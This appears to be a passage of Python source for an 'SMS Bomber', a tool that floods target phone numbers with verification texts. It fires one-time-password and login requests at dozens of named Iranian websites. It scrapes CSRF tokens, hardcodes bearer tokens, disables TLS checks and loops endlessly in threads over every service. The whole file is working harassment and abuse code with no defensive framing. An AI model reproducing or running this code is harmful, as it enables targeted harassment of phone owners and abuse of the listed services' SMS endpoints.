        "Authorization": "Bearer eyJhbGciOiJIUzl1NilsInR5cCl6lkpXVCJ9.eyJidXMiOilOZilsInRybil6ljE3liwic3JjljoiMiJ9.vvpr9fgASvk7B714KQKCz-SaCmoErab_p3cslvULG1W",
        "X-PlayerID": "dfb64872-1076-49c9-a2e1-a2a68eb80bf4",
        "Sessionld": "session_adffeb7f-1d11-45fc-b0f7-2209fa54f1ba",
        "Origin": "https://www.mrbilit.ir",
        "Referer": "https://www.mrbilit.ir/",
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mrbilit) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mrbilit) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mrbilit Exception: {e}{a}')
        return False


def ghasedak24(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://ghasedak24.com/user/otp"
    
    # معمولاً اینگونه سایت‌ها از POST با پارامتر mobile استفاده می‌کنند
    payload = {
        "mobile": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://ghasedak24.com",
        "Referer": "https://ghasedak24.com/",
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(ghasedak24) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (ghasedak24) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] ghasedak24 Exception: {e}{a}')
        return False


def trip(phone):
    try:
        url = "https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "user-agent": random.choice(user_agents),
        }
        
        payload = {
            "phoneNumber": formatted_phone,
            "token": "VHJpcDUzODc1NDUxNzAxNzU2Mzk3MTU3MTYy"  # توکن ثابت
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] trip Status: {response.status_code}{a}')
        print(f'{y}[Debug] trip Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(trip) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] trip error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] trip exception: {e}{a}')
        return False


def mo7_ir(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mo7.ir/bakala/ajax/send_code/"
    
    payload = {
        "action": "bakala_send_code",
        "phone_email": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-CSRF-TOKEN": "b5ea5c0516",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://mo7.ir",
        "Referer": "https://mo7.ir/",
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mo7_ir) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mo7_ir) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mo7_ir Exception: {e}{a}')
        return False
        

def dgshahr(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://lend-b.dgshahr.com/user/login/"
    
    payload = {
        "phone_number": formatted_phone,
        "source": "google-organic",
        "campaign": "undefined"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://lend-b.dgshahr.com",
        "Referer": "https://lend-b.dgshahr.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(dgshahr) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (dgshahr) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] dgshahr Exception: {e}{a}')
        return False



def torobpay(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.torobpay.com/user/v1/login/?source=mobile&http_referrer=https%3A%2F%2Fwww.google.com%2F"
    
    payload = {
        "phone_number": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-CSRFTOKEN": "",
        "Origin": "https://torobpay.com",
        "Referer": "https://torobpay.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(torobpay) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (torobpay) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] torobpay Exception: {e}{a}')
        return False

def malltina(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.malltina.com/profiles"
    
    payload = {
        "password": "mM12345678",
        "mobile": formatted_phone,
        "sign_up_referral_link": "https://www.google.com/"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.malltina.com",
        "Referer": "https://www.malltina.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(malltina) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (malltina) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] malltina Exception: {e}{a}')
        return False


def missomister(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://www.missomister.com/", timeout=10)
        
        # استخراج CSRF_TOKEN
        csrf_token = None
        csrf_patterns = [
            r'name="csrf" value="([a-f0-9]+)"',
            r'name="dig_nounce" value="([a-f0-9]+)"'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                csrf_token = match.group(1)
                break
        
        if not csrf_token:
            csrf_token = "7bc87785e8"
        
        url = "https://www.missomister.com/wp-admin/admin-ajax.php"
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": digits_phone,
            "csrf": csrf_token,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "json": "1",
            "whatsapp": "0"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.missomister.com",
            "Referer": "https://www.missomister.com/",
        }
        
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            if response.text.strip() == "1":
                print(f'{g}(missomister) {a}Code Sent')
                return True
        
        print(f'{r}[-] (missomister) Failed{a}')
        return False
            
    except Exception:
        print(f'{r}[-] (missomister) Failed{a}')
        return False


def candom_shop(phone):

    try:
        # پاکسازی شماره
        if phone.startswith('+98'):
            formatted_phone = "0" + phone[3:]
        elif phone.startswith('98'):
            formatted_phone = "0" + phone[2:]
        else:
            formatted_phone = phone

        # مرحله 1: دریافت CSRF token از صفحه اصلی
        url_main = "https://candom.shop/"
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) "
                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        }
        resp = requests.get(url_main, headers=headers, timeout=10)
        if resp.status_code != 200:
            print(f"[-] Candom Shop: خطا در دریافت صفحه اصلی ({resp.status_code})")
            return False

        soup = BeautifulSoup(resp.text, "html.parser")
        token_tag = soup.find("meta", attrs={"name": "csrf-token"})
        if not token_tag:
            print("[-] Candom Shop: دریافت توکن ناموفق بود")
            return False
        csrf_token = token_tag["content"]

        # مرحله 2: ارسال درخواست POST
        post_url = "https://candom.shop/bakala/ajax/send_code/"
        payload = {
            "action": "bakala_send_code",
            "phone_email": formatted_phone
        }
        headers_post = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) "
                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-CSRF-TOKEN": csrf_token,
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://candom.shop",
            "Referer": "https://candom.shop/",
        }

        response = requests.post(post_url, data=payload, headers=headers_post, timeout=10)
        if response.status_code == 200:
            print(f"[+] Candom Shop: کد ارسال شد ({formatted_phone})")
            return True
        else:
            print(f"[-] Candom Shop: خطا - کد وضعیت {response.status_code}")
            return False

    except Exception as e:
        print(f"[!] Candom Shop: خطا - {e}")
        return False

def tapsi_food(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.tapsi.food/v1/api/Authentication/otp"
    
    payload = {
        "cellPhone": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJHdWVzdElkIjoiZTc4ZjIwMzgtZjgzNi00MDA2LThjYzItYTYzY2YzMmI2OWY5IiwiVHlwZSI6Ikd1ZXN0IiwiRXhwaXJlSW4iOiIxMDgwMDAwMCIsIm5iZiI6MTc1NjI0Mzc1OCwiZXhwIjoxNzU2MjU0NTU4LCJpYXQiOjE3NTYyNDM3NTgsImlzcyI6Imh0dHBzOi8vbG9jYWxob3N0OjUwMDEiLCJhdWQiOiJodHRwczovL2xvY2FsaG9zdDo1MDAxIn0.FJnYvqwBa9za2y0SGANgFg_3PGNLeZkeCDPebJS0YTE",
        "x-platform": "mobile",
        "x-app-version": "v1.5.12-prd",
        "Origin": "https://tapsi.food",
        "Referer": "https://tapsi.food/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(tapsi_food) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (tapsi_food) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] tapsi_food Exception: {e}{a}')
        return False


def banimode(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mobapi.banimode.com/api/v2/auth/request"
    
    payload = {
        "phone": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "https://www.banimode.com",
        "Referer": "https://www.banimode.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(banimode) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (banimode) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] banimode Exception: {e}{a}')
        return False
        

def iranhotel(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "api-supported-versions": "1.0",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
            "Origin": "https://www.iranhotelonline.com",
            "Referer": "https://www.iranhotelonline.com/"
        }
        
        payload = {
            "Email": "",
            "Mobile": formatted_phone,
            "ActivationWay": 1,
            "Token": ""
        }
        
        response = requests.post(
            "https://www.iranhotelonline.com/api/mvc/Account/SendActivationCode",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[iranhotel] Status: {response.status_code}{a}')
        print(f'{y}[iranhotel] Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(iranhotel) Activation code sent! ✅{a}')
            return True
        else:
            print(f'{r}[-] iranhotel error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] iranhotel exception: {e}{a}')
        return False


        
# ==========================
# لیست سرویس‌ها (می‌توانی همه سرویس‌های V4 را اضافه کنی)
# ==========================

services = [
    abantether, abanapps, abzarmarket, accounts1606, achareh, activecleaners, alibaba, alldigitall, alopeyk_safir, amirkabircarpet,
    angeliran, aryakalaabzar, arzplus, arzunex, automoby, azkivam, azno, baldano, bamkhodro, banimode,
    Balad, barghapp, bargheto, barghman, bazari, Besparto, bimebazar, bimeh, bimehland, bimeparsian,
    bimasi, bimesho, bit24, bitpin, bodoroj, booking, bornosmode, candom_shop, cartesabz, chapmatin,
    charter118, Charsooq, cita, coinkade, dastakht, darunet, denj, denro, dgshahr, DigikalaJet,
    digikala, divar, drnext, drto, eavar, ebimename, eghamat24, ekeepa, elanza, fadaktrains,
    farshonline, gap, gapfilm, ghasedak24, gruccia, hajamooo, hami_bime, harikashop, hotelyar, ibime,
    ilozi, instagram_send, iranhotel, irankohan, karnameh, katonikhan, katoonistore, khodro45, Koohshid, komodaa,
    mahabadperfume, malltina, mashinno, masterkala, mek, milli_gold, missomister, mo7_ir, mobilex, modema,
    mohrpegah, mootanroo, motorbargh, mrbilit, mryadaki, mydigipay, nikpardakht, niktakala, node, Okala,
    okorosh, ompfinex, otaghak, padmira, paklean_call, payaneh, payonshoes, pindo, pinket, proparts,
    raastin, ragham_call, raheeno, release, riiha, roozima, safarbazi, Sandalestan, sarmayex, ShahreSandal,
    shahrfarsh, sheypoor, shojapart, sibapp, sibbank, smarket, snapp, snapp_bime, snappshop, sub,
    t4f, tabdeal, tapsi, tapsi_food, teamgraphic, tebinja, technogold, telegram_send, tetherland, theshoes,
    three_click, ticketchi, toorangco, torobpay, trip, trip_call, twox, ubitex, vakiljo, virgool,
    vitrin_shop, washino, xmohr
]


# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, delay=0.1):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║         SMS Bomber by M.M.]R               ║
{y}╚════════════════════════════════════════════╝
{g} Coded by: {r}M.M.]R{a}
{y}══════════════════════════════════════════════
{g} Services Loaded: {y}{len(services)}{a}
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        vip(phones, delay)

